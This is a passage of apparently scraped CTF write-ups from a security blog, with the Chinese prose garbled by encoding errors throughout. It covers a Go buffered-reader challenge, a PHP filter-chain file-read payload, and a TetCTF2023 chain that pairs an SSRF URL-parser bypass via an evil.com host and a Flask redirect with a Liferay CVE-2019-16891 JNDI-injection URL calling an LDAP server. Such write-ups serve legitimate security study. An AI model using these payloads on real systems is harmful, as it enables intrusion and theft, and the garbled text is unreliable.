é¦–å…ˆç®€å•çœ‹ä¸€ä¸‹å¯ä»¥å¾—å‡ºç¨‹åºé€»è¾‘å¦‚æœèƒ½æˆåŠŸèµ°åˆ°justReadItå‡½æ•°æœ€ä¸‹æ–¹å°±èƒ½è·å¾—flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func justReadIt(w http.ResponseWriter, r *http.Request) &#123; defer r.Body.Close() body, err := ioutil.ReadAll(r.Body) if err != nil &#123; w.WriteHeader(500) w.Write([]byte(&quot;bad request\\n&quot;)) return &#125; reqData := ReadOrderReq&#123;&#125; if err := json.Unmarshal(body, &amp;reqData); err != nil &#123; w.WriteHeader(500) w.Write([]byte(&quot;invalid body\\n&quot;)) return &#125; if len(reqData.Orders) &gt; MaxOrders &#123; w.WriteHeader(500) w.Write([]byte(&quot;whoa there, max 10 orders!\\n&quot;)) return &#125; reader := bytes.NewReader(randomData) validator := NewValidator() ctx := context.Background() for _, o := range reqData.Orders &#123; if err := validator.CheckReadOrder(o); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;error: %v\\n&quot;, err))) return &#125; ctx = WithValidatorCtx(ctx, reader, int(o)) _, err := validator.Read(ctx) if err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;failed to read: %v\\n&quot;, err))) return &#125; &#125; if err := validator.Validate(ctx); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;validation failed: %v\\n&quot;, err))) return &#125; w.WriteHeader(200) w.Write([]byte(os.Getenv(&quot;FLAG&quot;)))&#125; æˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ï¼Œé¦–å…ˆæ˜¯æ¥å—äº†ä¸€ä¸ªä¼ æ¥çš„jsonæ•°æ®ï¼Œè§£æä¿å­˜åˆ°reqDataå½“ä¸­ï¼Œä»ä¸‹é¢å¯ä»¥çœ‹å‡ºåªæ¥æ”¶ä¸€ä¸ªå®Œå…¨ç”±æ•°å­—ç»„æˆçš„intæ•°ç»„ï¼Œå­—æ®µåå«orders 123type ReadOrderReq struct &#123; Orders []int `json:&quot;orders&quot;`&#125; ä¹‹åä¼šç”¨randomDataåˆå§‹åŒ–ä¸€ä¸ªreader 1reader := bytes.NewReader(randomData) è€Œè¿™ä¸ªrandomDataåˆ™æ˜¯ç”±initRandomDataå‡½æ•°åˆå§‹åŒ–ï¼Œè®°ä½è¿™ä¸ªpasswordå¤åˆ¶åœ¨äº†12625ä¹‹å 12345678func initRandomData() &#123; rand.Seed(1337) randomData = make([]byte, 24576) if _, err := rand.Read(randomData); err != nil &#123; panic(err) &#125; copy(randomData[12625:], password[:])&#125; åˆå§‹åŒ–ä¹‹åä¼šéå†reqData.Orders è°ƒç”¨CheckReadOrderæ£€æŸ¥odersä¸­çš„intå€¼èŒƒå›´æ˜¯å¦åœ¨0-100 123456func (v *Validator) CheckReadOrder(o int) error &#123; if o &lt;= 0 || o &gt; 100 &#123; return fmt.Errorf(&quot;invalid order %v&quot;, o) &#125; return nil&#125; ä¹‹åæ ¹æ®æ•°å€¼è¯»å‡ºæŒ‡å®šä½æ•°çš„å€¼ 12ctx = WithValidatorCtx(ctx, reader, int(o))_, err := validator.Read(ctx) å†å¾€ä¸‹å°±æ˜¯æœ€å…³é”®çš„åœ°æ–¹ï¼Œå¦‚æœè¿™é‡Œçš„validateæ ¡éªŒè¿‡äº†æ‰èƒ½æ‹¿åˆ°flag 12345678if err := validator.Validate(ctx); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;validation failed: %v\\n&quot;, err))) return &#125; w.WriteHeader(200) w.Write([]byte(os.Getenv(&quot;FLAG&quot;))) è¿™ä¸ªå‡½æ•°åŠŸèƒ½å°±æ˜¯è¯»32ä½ï¼Œä¹‹åä¸passwordæ¯”è¾ƒï¼ŒæˆåŠŸè¿”å›trueï¼Œè€Œæˆ‘ä»¬å‰é¢è¯´è¿‡è¿™ä¸ªpasswordå¤åˆ¶åœ¨äº†12625ä¹‹åï¼Œå¹¶ä¸”odersæ•°ç»„å®¹é‡æœ€å¤šåªèƒ½æœ‰10ä¸ªæ•°å­— 1234567891011func (v *Validator) Validate(ctx context.Context) error &#123; r, _ := GetValidatorCtxData(ctx) buf, err := v.Read(WithValidatorCtx(ctx, r, 32)) if err != nil &#123; return err &#125; if bytes.Compare(buf, password[:]) != 0 &#123; return errors.New(&quot;invalid password&quot;) &#125; return nil&#125; å°±ç®—å…¨å–æœ€å¤§100ï¼Œ10ä¸ªä¹Ÿæ‰1000ï¼Œè·ç¦»æˆ‘ä»¬çš„12625è¿˜å·®å¾ˆè¿œ å†å¾€å‰çœ‹å‘ç°readä¹‹å‰ 123456789func (v *Validator) Read(ctx context.Context) ([]byte, error) &#123; r, s := GetValidatorCtxData(ctx) buf := make([]byte, s) _, err := r.Read(buf) if err != nil &#123; return nil, fmt.Errorf(&quot;read error: %v&quot;, err) &#125; return buf, nil&#125; æœ‰è¿™æ ·ä¸€ä¸ªè°ƒç”¨ï¼Œå¦‚æœsizeå¤§äºç­‰äº100ä¼šè°ƒç”¨ä¸€ä¸ªbufio.NewReader 12345678func GetValidatorCtxData(ctx context.Context) (io.Reader, int) &#123; reader := ctx.Value(reqValReaderKey).(io.Reader) size := ctx.Value(reqValSizeKey).(int) if size &gt;= 100 &#123; reader = bufio.NewReader(reader) &#125; return reader, size&#125; è¿™ä¸ªdefaultBufSizeæ˜¯4096 1234// NewReader returns a new Reader whose buffer has the default size.func NewReader(rd io.Reader) *Reader &#123; return NewReaderSize(rd, defaultBufSize)&#125; æœ€ç»ˆ Paywallæƒ³çœ‹åŸç†çš„ç§»æ­¥é™†é˜Ÿä¹‹å‰å†™çš„ï¼Œæˆ‘æ˜¯è„šæœ¬å°å­ https://tttang.com/archive/1395/#toc_iconv-filter-chain æœ¬é¢˜æ˜¯ç”¨phpå®ç°çš„ä¸€ä¸ªblogç³»ç»Ÿï¼Œé™¤å¼€æ ·å¼è¯»å–æ ¸å¿ƒä»£ç éå¸¸ç®€å• 12345678910111213141516171819202122&lt;?php error_reporting(0); set_include_path(&#x27;articles/&#x27;); if (isset($_GET[&#x27;p&#x27;])) &#123; $article_content = file_get_contents($_GET[&#x27;p&#x27;], 1); if (strpos($article_content, &#x27;PREMIUM&#x27;) === 0) &#123; die(&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;); // TODO: implement subscriptions &#125; else if (strpos($article_content, &#x27;FREE&#x27;) === 0) &#123; echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;; die(); &#125; else &#123; die(&#x27;nothing here&#x27;); &#125; &#125; ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºæ–‡ç« å†…å®¹å‰æ˜¯PREMIUMçš„ä¸èƒ½è¯»å–ï¼ŒFREEçš„åˆ™å¯ä»¥è¯» å¾ˆå¯æƒœæˆ‘ä»¬çš„flagæ–‡ä»¶æ°å¥½å‰é¢ä¹Ÿæ˜¯PREMIUMï¼Œé‚£ä¹ˆè¦æƒ³è¯»å–è¿™ä¸ªæ–‡ä»¶å¾ˆæ˜¾ç„¶æˆ‘ä»¬å¯ä»¥é…åˆphpçš„filteræ„é€ å‡ºFREEå››ä¸ªå­—æ¯ä¹Ÿå°±å¯ä»¥å®ç°è¯»å–äº† ä¸‹é¢æ˜¯å·¥å…· https://github.com/synacktiv/php_filter_chain_generator https://github.com/WAY29/php_filter_chain_generator å‘ç°ç›´æ¥ç”Ÿæˆå‡ºæ¥çš„è™½ç„¶æœ‰FREEï¼Œä½†æ˜¯éƒ½æ— æ³•çœ‹äº† 1FREE\u0001ï¿½Bï¿½5\u0005$TÔ•Tï¿½\u0002ï¿½\u0006ï¿½FVï¿½ï¿½Fï¿½Fï¿½ï¿½Uï¿½Eï¿½7V&#x27;65#\u0016#\u0016ï¿½uï¿½C\u0005ï¿½ï¿½W%ï¿½ï¿½7w5\u0004ï¿½\u0006\u0017\u0006W&quot;\u0017ï¿½ï¿½ï¿½ï¿½&gt;==\u000fï¿½\u000f@\u000fCï¿½\u0003ï¿½\u0003ï¿½ï¿½ï¿½ï¿½&gt;==\u000fï¿½\u000f@\u000f ç„¶è€Œå‘ç°æŠŠæ¯ä¸ªç¯èŠ‚çš„convert.iconv.UTF8.UTF7å»æ‰ å°±å¯ä»¥å˜æˆæ˜æ–‡äº†ï¼Œè„šæœ¬å°å­è¡¨ç¤ºå¾ˆç¥å¥‡ï¼Œæœ€åä¸ºäº†ä¸ä¸¢å¤±ç¬¦å·(æ¯•ç«ŸBase64å­—ç¬¦é‡Œé¢æ²¡æœ‰ä¸€äº›ç‰¹æ®Šç¬¦å·!&#123;&#125;!ä¹‹ç±»çš„)ï¼Œå› æ­¤ç¬¬ä¸€æ­¥äº‹å…ˆbase64enccodeä¸€ä¸‹ æœ€ç»ˆå¾—åˆ°payload 1http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag ä½†æ˜¯æ ¹æ®è¿™æ ·æ„é€ æœ¬åœ°å‘ç°ä¼šå°‘æœ€åä¸‰ä¸ªå­—ç¬¦ï¼Œé™¤å¼€}ç¬¦å·è¿˜å‰©ä¸¤ä¸ª çœ‹çœ‹é¢˜ç›®æè¿°å¯ä»¥çŒœå‡ºæœ€åä¿©å­—ç¬¦ï¼ŒTh4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaperï¼Œæœ€åä¸€ä¸ªå­—æ¯è‚¯å®šæ˜¯ä¸ªç¬¦å·æ‰€ä»¥æ˜¯! 1idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125; å½“ç„¶æœ€åå‘ç°å·¥å…·ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ï¼Œæ³¨æ„åé¢æœ‰ä¿©ç©ºæ ¼ 1python php_filter_chain_generator.py --chain &#x27;FREE &#x27; å¾—åˆ° 1php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag æœ¬è„šæœ¬å°å­è§‰å¾—å¾ˆæœ‰æ„æ€å°±æ˜¯äº†","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"}]},{"title":"TetCTF2023&Liferay(CVE-2019-16891)(Pre-Auth RCE)","slug":"year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE","date":"2023-01-03T03:07:19.000Z","updated":"2024-08-04T09:01:49.726Z","comments":true,"path":"2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/","link":"","permalink":"https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/","excerpt":"","text":"TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)è¿™å‘¨æœ«æ‰“äº†è¿™ä¸ªæ¯”èµ›æŒºä¸é”™çš„ä¸€ä¸ªï¼Œä½†æ˜¯ä¸»è¦è¿˜æ˜¯å†™ä¸€ä¸‹è¿™é¢˜ï¼Œå…¶ä»–é¢˜è™½ç„¶ä¹Ÿæœ‰éš¾åº¦ä½†æ˜¯å¹¶ä¸å€¼å¾—æˆ‘è®°å½• æ­£æ–‡é¦–å…ˆè¿™é¢˜è¢«æ‹†åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œè§‰å¾—ä¸¤éƒ¨åˆ†éƒ½æŒºæœ‰æ„æ€çš„ï¼Œå°±å•ç‹¬è®²è®² part1ä¸»è¦æ˜¯åˆ©ç”¨nodeä¸pythonçš„requestsçš„å·®å¼‚æ€§ç»•è¿‡hosté™åˆ¶ part2ä¸»è¦æ˜¯ä»…ä»…é€šè¿‡ä¸€ä¸ªGETè§¦å‘Liferayçš„RCE å…³äºé¢˜ç›®å¤‡ä»½ä¹Ÿæ˜¯æ”¾åœ¨äº†æˆ‘çš„Gité‡Œï¼šhttps://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF Part1é¦–å…ˆä¸€çœ¼çœ‹åˆ°è¿™ä¸ªè·¯ç”± 1app.post(&#x27;/api/getImage&#x27;, isAdmin, validate, async (req, res, next) =&gt; &#123; è¿™é‡Œé¢æœ‰ä¸ªé‰´æƒæ“ä½œï¼Œè¦æ±‚å¯†ç æ˜¯Th!sIsS3xreT0ä½†æ˜¯é•¿åº¦ä¸èƒ½å¤§äº12ï¼Œå¾ˆå¸¸è§„åŸºç¡€çš„è€ƒç‚¹äº†ï¼Œé€šè¿‡æ•°ç»„å°±è¡Œ?password[]=Th!sIsS3xreT0 12345678910const isAdmin = (req, res, next) =&gt; &#123; try &#123; if (req.query.password.length &gt; 12 || req.query.password != &quot;Th!sIsS3xreT0&quot;) &#123; return res.send(&quot;You don&#x27;t have permission&quot;) &#125; next(); &#125; catch (error) &#123; return res.status(500).send(&quot;Oops, something went wrong.&quot;); &#125;&#125; æ¥ç€æ¥çœ‹çœ‹å‰©ä¸‹çš„ä»£ç  123456789101112131415161718192021222324app.post(&#x27;/api/getImage&#x27;, isAdmin, validate, async (req, res, next) =&gt; &#123; try &#123; const url = req.body.url.toString() let result = &#123;&#125; if (IsValidProtocol(url)) &#123; const flag = isValidHost(url) if (flag) &#123; console.log(&quot;[DEBUG]: &quot; + url) let res = await downloadImage(url) result = res &#125; else &#123; result.status = false result.data = &quot;Invalid host i.ibb.co&quot; &#125; &#125; else &#123; result.status = false result.data = &quot;Invalid url&quot; &#125; res.json(result) &#125; catch (error) &#123; res.status(500).send(error.stack) &#125;&#125;) è¿™é‡ŒIsValidProtocolè¦æ±‚åªèƒ½æ˜¯http/httpsï¼ŒisValidHostè¦æ±‚hoståªèƒ½æ˜¯i.ibb.coè¿™ä¸ªå›¾åºŠç½‘ç«™(ä½¿ç”¨urlParseè§£æ) ä¹‹åå¦‚æœæ ¡éªŒæˆåŠŸåˆ™ä¼šè°ƒç”¨pythonå»ä¸‹è½½ 1234567891011121314151617181920212223242526272829f __name__ == &#x27;__main__&#x27;: try: if (len(sys.argv) &lt; 2): exit() url = sys.argv[1] headers = &#123;&#x27;user-agent&#x27;: &#x27;PythonBot/0.0.1&#x27;&#125; request = requests.session() request.mount(&#x27;file://&#x27;, LocalFileAdapter()) # check extentsion white_list_ext = (&#x27;.jpg&#x27;, &#x27;.png&#x27;, &#x27;.jpeg&#x27;, &#x27;.gif&#x27;) vaild_extension = url.endswith(white_list_ext) if (vaild_extension): # check content-type res = request.head(url, headers=headers, timeout=3) if (&#x27;image&#x27; in res.headers.get(&quot;Content-type&quot;) or &#x27;image&#x27; in res.headers.get(&quot;content-type&quot;) or &#x27;image&#x27; in res.headers.get(&quot;Content-Type&quot;)): r = request.get(url, headers=headers, timeout=3) print(base64.b64encode(r.content)) else: print(0) else: print(0) except Exception as e: # print e print(0) æ­£å¸¸æƒ…å†µæ¥è¯´å¦‚æœæˆ‘ä»¬ä½¿ç”¨ï¼šhttp://evil.com@i.ibb.co/1.png nodeå’Œpythonç»è¿‡parseåè®¿é—®çš„å…¶å®ä¹Ÿéƒ½æ˜¯http://i.ibb.co/1.png é‚£æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•è®©nodeå’Œpyè¡Œä¸ºç›¸å¼‚ï¼Œpythonçš„requestsåº“æ˜¯åŸºäºurllibå®ç°çš„ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å»åŒºåˆ†scheme, authority, path, query, fragmentç­‰éƒ¨åˆ†æ˜¯é æ­£åˆ™å®ç°çš„ å¯¹åº”çš„æ­£åˆ™ 12345678URI_RE = re.compile(r&quot;^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?&quot;r&quot;(?://([^\\\\/?#]*))?&quot; é è¿™äº›ç¬¦å·å†³å®šauthorityéƒ¨åˆ†è¾¹ç•Œr&quot;([^?#]*)&quot;r&quot;(?:\\?([^#]*))?&quot;r&quot;(?:#(.*))?$&quot;,re.UNICODE | re.DOTALL,) å› æ­¤å¦‚æœæœ€ç»ˆæˆ‘ä»¬ä½¿ç”¨çš„urlæ˜¯ http://evil.com1232\\@i.ibb.co/1.png nodeéƒ¨åˆ†åˆ™ä¼šæ­£ç¡®è§£æå‡ºhostä¸ºi.ibb.co pythonéƒ¨åˆ†ç”±äºé‡åˆ°äº†\\å­—ç¬¦å…¶å®æ˜¯æŠŠåé¢æ•´ä½“å½“æˆäº†pathï¼Œæœ€ç»ˆè®¿é—®çš„urlå…¶å®æ˜¯ http://evil.com1232/\\@i.ibb.co/1.png å¦‚å›¾æµ‹è¯• åœ¨è¿™ä¸ªåŸºç¡€ä¸Šæˆ‘ä»¬å¯ä»¥é…åˆflaskç®€å•å†™ä¸ªè§£æè¿™ä¸ªç•¸å½¢è·¯å¾„çš„è¯·æ±‚å¹¶é‡å®šå‘åˆ°æŒ‡å®šä½ç½®å³å¯å®Œæˆssrf 123456789101112131415from flask import Flask,requestfrom urllib.parse import quoteimport requestsapp = Flask(__name__)@app.route(&#x27;/\\\\@i.ibb.co/1.png&#x27;)def hello_world(): return &quot;login fail&quot;, 302, [(&quot;Content-Type&quot;, &quot;image&quot;), (&quot;Location&quot;, &quot;file:///usr/src/app/fl4gg_tetCTF&quot;)] # return&quot;23333&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=&quot;1239&quot;,debug=False) Part2ç¬¬äºŒéƒ¨åˆ†æ˜¯è¿™ä¸ªLiferayçš„ä¸€ä¸ªå‰å°RCEï¼Œçœ‹DockerFileå¯ä»¥çœ‹åˆ°è¿™ä¸ªç‰ˆæœ¬ ç½‘ä¸Šè¾ƒå¤šçš„æ˜¯å…³äºcve-2020-7961çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯é /api/jsonws/xxxxå»å®ç°çš„RCE ç„¶è€Œè¿™é‡Œæœ‰ä¸¤ä¸ªé™åˆ¶ ç¬¬ä¸€ä¸ªï¼Œä»part1éƒ¨åˆ†æˆ‘ä»¬èƒ½å¾—åˆ°ä¸€ç‚¹ï¼Œæˆ‘ä»¬çš„SSRFåªèƒ½è§¦å‘ä¸€ä¸ªGETè¯·æ±‚ ç¬¬äºŒä¸ªï¼Œè¿™é‡Œå¯¹è·¯ç”±åšäº†äº›é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„apiç›¸å…³è·¯ç”±éƒ½ä¸èƒ½è®¿é—®äº†å’‹åŠå‘¢ï¼Ÿ å…³äºè¿™ä¸ªæˆ‘åœ¨ç½‘ä¸Šæœç´¢å‘ç°å‡ºé¢˜äººæ›¾å‘äº†ä¸€ä¸ªè¿™ä¸ªæ–‡ç«  https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/ åœ¨æ–‡ç« æœ€åæåˆ°äº†è¿™ç‚¹éªŒè¯äº†æˆ‘ä»¬çš„çŒœæƒ³ï¼ŒåŒæ—¶ä¹ŸçŸ¥é“äº†å¤§æ¦‚ä¹Ÿæ˜¯å’Œjsonååºåˆ—åŒ–æœ‰å…³ ä¹‹åçš„è¯åˆçœ‹åˆ°ä¸€ç¯‡æ–‡ç«  https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from è¿™é‡Œåƒæˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªæ–°çš„è·¯ç”± ä»struts-config.xmlå½“ä¸­å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å…¨ç±»å 1&lt;action path=&quot;/portal/portlet_url&quot; type=&quot;com.liferay.portal.action.PortletURLAction&quot; /&gt; è¿™ä¸ªç±»åœ¨/liferay-portal-6.1.2-ce-ga3/tomcat-7.0.40/webapps/ROOT/WEB-INF/lib/portal-impl.jar!/com/liferay/portal/action/PortletURLAction.classä¸‹ ä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ˜¯GETä¼ å‚æ•°ä¹Ÿå¯ä»¥ å†å¾€ä¸‹çœ‹ï¼Œå¯ä»¥å¾—çŸ¥è¿™é‡Œæ˜¯å¯ä»¥è§¦å‘liferayçš„jsonååºåˆ—åŒ– è¿™é‡Œæˆ‘ä»¬æŒ‘é‡ç‚¹æ¥è®²ï¼Œæœ€ç»ˆååºåˆ—åŒ–ä¼šè§¦å‘org.jabsorb.JSONSerializer#unmarshall è¿™é‡Œä»–ä¼šè°ƒç”¨getSerializerå»é€‰æ‹©ä¸€ä¸ªèƒ½æ»¡è¶³ååºåˆ—åŒ–è¯¥javaCLassçš„ç±» é¦–å…ˆéå†serializableMapçœ‹æœ‰æ²¡æœ‰è¯¥javaClassç›´æ¥å¯¹åº”æ˜ å°„çš„å¤„ç†ï¼Œè¿™ä¸ªserializableMapå½“ä¸­æœ‰å¾ˆå¤šï¼Œä½†å¤§å¤šéƒ½æ˜¯ä¸€äº›åŸºç¡€ç±»å‹çš„ç±»çš„å¤„ç† æ²¡æœ‰çš„è¯å®ƒä¼šç»§ç»­éå†serializerListçœ‹çœ‹æœ‰æ²¡æœ‰èƒ½å¤„ç†è¯¥ç±»çš„ï¼Œä¹Ÿå°±æ˜¯å…¶canSerializeè¿”å›true æˆ‘ä»¬åªéœ€è¦å…³æ³¨ä¸¤ä¸ªå³å¯ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ä¸€äº›åŸºç¡€ç±»å‹ä¹‹ç±»çš„ä¸éœ€è¦è¿‡å¤šå…³æ³¨ ä¸€ä¸ªæ˜¯com.liferay.portal.json.jabsorb.serializer.LiferaySerializer 12345678910public boolean canSerialize(Class clazz, Class jsonClass) &#123; Constructor constructor = null; try &#123; constructor = clazz.getConstructor(); &#125; catch (Exception var4) &#123; &#125; return Serializable.class.isAssignableFrom(clazz) &amp;&amp; (jsonClass == null || jsonClass == JSONObject.class) &amp;&amp; constructor != null; &#125; å…¶å¯¹åº”çš„unmarshallæ–¹æ³•å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°åªæ˜¯é€šè¿‡ä¸€äº›åå°„å»å¯¹classå¯¹åº”å­—æ®µèµ‹å€¼ å¦ä¸€ä¸ªæ˜¯org.jabsorb.serializer.impl.BeanSerializer 123public boolean canSerialize(Class clazz, Class jsonClazz) &#123; return !clazz.isArray() &amp;&amp; !clazz.isPrimitive() &amp;&amp; !clazz.isInterface() &amp;&amp; (jsonClazz == null || jsonClazz == JSONObject.class); &#125; å…¶å¯¹åº”çš„unmarshallæ–¹æ³•å½“ä¸­ï¼Œåˆ™æ˜¯è°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•ï¼Œè¿™ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ è¿™ä¸¤ä¸ªç±»å¤„ç†æœ€å¤§çš„åŒºåˆ«å°±æ˜¯javaClasssæ˜¯å¦ç»§æ‰¿äº†Serializableæ¥å£ï¼Œå› æ­¤æˆ‘ä»¬æ‰¾æ¶æ„ç±»æ¡ä»¶å°±æ˜¯ä¸èƒ½ç»§æ‰¿Serializableæ¥å£ï¼ŒåŒæ—¶setæ–¹æ³•æœ‰æ¶æ„æ“ä½œï¼Œè¿™ç§æ—¶å€™å°±å»çœ‹fastjsonå’Œjacksonçš„é»‘åå•å°±å¯ä»¥äº† æ¯”å¦‚jacksoné‡Œé¢é»‘åå•é‡Œçš„ä¸€ä¸ªç±»åˆšå¥½åœ¨æˆ‘ä»¬liferayå½“ä¸­ åŒæ—¶å…¶setæ–¹æ³•æœ‰ä¸€ä¸ªèƒ½ç›´æ¥è§¦å‘jndiçš„ æœ€ç»ˆæˆ‘ä»¬æŠŠè¿™ä¸²ä»£ç æ”¾è¿›ä¹‹å‰çš„æ¶æ„flaskè§¦å‘é‡å®šå‘åï¼Œé€šè¿‡jndiæ”»å‡»å†…ç½‘æœåŠ¡ 1http://admin-portal:80/c/portal/portlet_url?parameterMap=&#123;&quot;javaClass&quot;:&quot;org.hibernate.jmx.StatisticsService&quot;,&quot;sessionFactoryJNDIName&quot;:&quot;ldap://ip&quot;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Nodejs","slug":"Nodejs","permalink":"https://y4tacker.github.io/tags/Nodejs/"}]},{"title":"æµ…è°ˆJspWebshellä¹‹ç¼–ç ","slug":"year/2022/11/æµ…è°ˆJspWebshellä¹‹ç¼–ç ","date":"2022-11-27T06:39:48.000Z","updated":"2024-08-04T09:01:49.080Z","comments":true,"path":"2022/11/27/year/2022/11/æµ…è°ˆJspWebshellä¹‹ç¼–ç /","link":"","permalink":"https://y4tacker.github.io/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/","excerpt":"","text":"æµ…è°ˆJspWebshellä¹‹ç¼–ç å†™åœ¨å‰é¢â€‹ æœ€è¿‘@phithonåœ¨çŸ¥è¯†æ˜Ÿçƒä¸­åˆ†äº«äº†ä¸€ä¸ªå¤šé‡ç¼–ç çš„webshellå§¿åŠ¿åï¼Œå…ˆè†œä¸€ä¸‹å¤§ä½¬ å‡ºäºå¯¹ä»£ç å®ç°çš„å¥½å¥‡ç®€å•çœ‹äº†çœ‹tomcatçš„å…·ä½“å®ç°ä»¥åŠå°è¯•æ˜¯å¦èƒ½å¤Ÿæ›´æ·±å…¥çš„ç›®çš„ä¹Ÿä¾¿æœ‰äº†æœ¬ç¯‡ï¼Œå½“ç„¶åé¢ä¹Ÿå‘ç°è¿™ç§æ–¹å¼ä¸å¤ªçµæ´»æ˜¯æœ‰ä¸€å®šç¼–ç é™åˆ¶çš„ï¼Œåé¢ä¹Ÿä¼šæåˆ°ï¼Œå½“ç„¶æœ€ç»ˆç»è¿‡æˆ‘çš„åŠªåŠ›ï¼Œå‘ç°äº†å…¶ä»–ä¸‰ç§å®ç°åŒé‡ç¼–ç çš„æ–¹å¼ï¼Œç”šè‡³æœ€åå‘ç°å¯ä»¥å®ç°ä¸‰é‡ç¼–ç  é‚£ä¹ˆä¸‹é¢å°±è¿›å…¥æ­£æ–‡å§ ç¯å¢ƒç›¸å…³åŠå…¶ä»–è¯´æ˜â€‹ æœ¬ç¯‡ä»¥tomcat8.0.50ä¸ºä¾‹è¿›è¡Œåˆ†æï¼Œåæ–‡ç®€ç§°ä¸ºtomcatï¼ŒåŒæ—¶è®¨è®ºçš„æ˜¯ç¬¬ä¸€æ¬¡è®¿é—®å¹¶ç¼–è¯‘jspçš„è¿‡ç¨‹(æœ‰å°åŒºåˆ«ä¸é‡è¦)å¹¶ä¸”ä¸æ¶‰åŠåˆ°å…¶ä»–å°ç‰ˆæœ¬å·®å¼‚ æ­£æ–‡è¿™é‡Œæ²¡æœ‰é‚£ä¹ˆå¤šåºŸè¯ï¼Œæˆ‘ä»¬çŸ¥é“å…¶å®jspæ˜¯ServletæŠ€æœ¯çš„æ‰©å±•ï¼Œå®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡å¯¹è¿™ä¸ªæ¨¡æ¿å†…å®¹çš„è§£æï¼Œæ 